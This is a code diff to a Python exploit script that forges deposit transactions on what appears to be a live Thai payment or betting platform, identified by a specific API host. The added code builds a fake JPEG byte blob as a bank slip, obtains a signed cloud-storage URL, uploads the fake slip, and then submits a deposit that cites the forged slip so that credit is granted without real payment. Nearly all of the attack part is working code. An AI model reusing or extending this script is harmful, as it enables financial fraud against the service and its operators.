@@ -144,6 +144,53 @@ def do_auth(phone=None, password=None):
 
 # ─── EXPLOITS ─────────────────────────────────────────────────────────────────
 
+FAKE_JPEG = bytes([
+    0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
+    0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,
+    0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,0x07,0x07,0x07,0x09,
+    0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
+    0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,
+    0x24,0x2E,0x27,0x20,0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,
+    0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,0x39,0x3D,0x38,0x32,
+    0x3C,0x2E,0x33,0x34,0x32,0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,
+    0x00,0x3F,0x00,0xF5,0x0A,0xFF,0xD9
+])
+
+
+def upload_slip_to_gcs(tid, domain, jwt):
+    """
+    Full GCS signed-URL upload flow:
+    1. POST /mb/sign-url-upload-slip → signed GCS URL + gcs_filename
+    2. PUT JPEG to GCS
+    Returns gcs_filename (to use as slip_image_url) or None on failure.
+    """
+    ts = int(time.time() * 1000)
+    fname = f"slip_{ts}.jpg"
+    code, raw = _r("POST",
+        f"https://{tid}mgapi.asdgapicenterssdo.com/mb/sign-url-upload-slip?domain={domain}",
+        jwt,
+        body={"filename": fname, "content_type": "image/jpeg", "size": len(FAKE_JPEG)})
+    if code != 200:
+        return None
+    sign_data = json.loads(raw)
+    upload_url   = sign_data.get("urlUpload", "")
+    gcs_filename = sign_data.get("filename", "")
+    if not upload_url or not gcs_filename:
+        return None
+
+    # PUT to GCS (no auth needed — pre-signed)
+    put_req = urllib.request.Request(upload_url, method="PUT",
+        data=FAKE_JPEG,
+        headers={"Content-Type": "image/jpeg"})
+    try:
+        with urllib.request.urlopen(put_req, context=CTX, timeout=15) as r:
+            if r.status == 200:
+                return gcs_filename
+    except Exception:
+        pass
+    return None
+
+
 def get_active_bank_id(tid, domain, jwt):
     """
     Discover active payment_bank_information_id by querying /mb/payment-bank-information
@@ -218,17 +265,24 @@ def exploit_F01_deposit():
     if not acct_id:
         err("No member account found"); return
 
-    # 2. Submit forged deposit
-    ts = int(time.time()*1000)
-    bkk = datetime.now(timezone(timedelta(hours=7)))
-    fake_slip = f"slips/{bkk.strftime('%Y/%m/%d')}/slip_{ts}.jpg"
+    # 2. Get slip_image_url — try real GCS upload first, fallback to fake path
+    info("Uploading slip to GCS (sign-url flow)...")
+    gcs_slip = upload_slip_to_gcs(tid, domain, jwt)
+    if gcs_slip:
+        slip_url = gcs_slip
+        ok(f"Real GCS slip: {gcs_slip}")
+    else:
+        ts = int(time.time()*1000)
+        bkk = datetime.now(timezone(timedelta(hours=7)))
+        slip_url = f"slips/{bkk.strftime('%Y/%m/%d')}/slip_{ts}.jpg"
+        info(f"GCS upload failed — using fake path: {slip_url}")
 
-    info(f"Submitting {amount:.2f} THB deposit (slip_image_url NOT validated)")
+    info(f"Submitting {amount:.2f} THB deposit")
     payload = {
         "deposit_amount":              amount,
         "payment_bank_information_id": bank_id,
         "deposit_account_id":          acct_id,
-        "slip_image_url":              fake_slip,
+        "slip_image_url":              slip_url,
     }
     code, raw = MPOST("/mb/deposit-transaction", payload)
     print(f"\n  HTTP {code}:")
